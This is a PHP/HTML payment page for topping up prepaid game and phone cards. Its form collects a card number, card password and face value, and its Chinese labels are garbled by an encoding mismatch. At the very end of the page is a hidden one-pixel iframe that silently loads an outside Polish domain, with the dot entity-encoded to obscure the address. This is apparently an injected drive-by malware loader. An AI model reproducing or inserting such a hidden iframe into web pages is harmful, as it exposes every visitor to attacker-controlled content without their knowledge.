<?php
include_once("../config.php");
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>֧���ύҳ</title>
<link rel="stylesheet" href="../images/app_style.css"  type="text/css" />
<script language=javascript src="../images/app_common.js"></script>
</head>
<body>
<div id="wrap">
<table width="100%" height="34" border="0" align="center" cellpadding="0" cellspacing="0" style="margin-top:20px">
  <tr>
    <td width="33%"><img src="../images/logo-pay.jpg" /></td>
	<td width="68%" valign="bottom"><span class="logotxt">���ٳ�ֵ</span></td>
  </tr>
</table>
      <table width="600" border="0" align="center" cellpadding="0" cellspacing="1" class="mytable">
	  <form name="f1" action="getway.php" method="post" onsubmit="return checkfrom(this)" target="_blank">
	  <tr>
	  <td height="25" align="right">ѡ���ࣺ</td>
	  <td>
	  <select name="channelId" id="channelId">
		 <option value=14>�ƶ���ֵ��</option><option value=6>����һ��ͨ</option><option value=4>��ѶQQ��</option><option value=15>��ͨ��ֵ��</option><option value=5>ʢ��һ��ͨ</option><option value=7>����һ��ͨ</option><option value=8>�Ѻ�һ��ͨ</option><option value=9>��;��Ϸ��</option><option value=10>����һ��ͨ</option><option value=11>����һ��ͨ</option><option value=13>���ų�ֵ��</option><option value=16>����һ��ͨ</option><option value=17>���һ��ͨ</option><option value=18>����һ��ͨ</option>
	 </select>
	 </td>
	  </tr>
	  <tr>
        <td height="25" align="right">���ţ�</td>
        <td><input name="cardId" type="text" id="cardId" class="app_input" />
        *</td>
      </tr>
      <tr>
        <td height="25" align="right">���ܣ�</td>
        <td><input name="cardPass" type="text" id="cardPass" class="app_input" />
          *</td>
      </tr>
	  <tr>
        <td height="25" align="right">��</td>
        <td><input name="faceValue" type="text" id="faceValue" class="app_input" />
        *����������ȷ�����</td>
      </tr>
      <!--<tr>
        <td height="25" align="right">��Ʒ���ƣ�</td>
        <td><input name="subject" type="text" id="subject" value="GamePay" maxlength="20" /></td>
      </tr>
      <tr>
        <td height="25" align="right">��Ʒ�۸�</td>
        <td><input name="price" type="text" id="price" value="1" maxlength="20" /> (��Ϊ��)</td>
      </tr>
      <tr>
        <td height="25" align="right">����������</td>
        <td><input name="quantity" type="text" id="quantity" value="1" maxlength="20" /> (��Ϊ��)</td>
      </tr>
      <tr>
        <td height="25" align="right">�Զ�����Ϣ��</td>
        <td><input name="notic" type="text" id="notic" value="��������ע" maxlength="100" /></td>
      </tr>-->
      
      <tr>
        <td height="25" colspan="2" align="center"><input name="Submit" type="submit" class="btn2 " value="�ύ" /></td>
      </tr>
	  </form>
    </table>
    <br />
</div>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>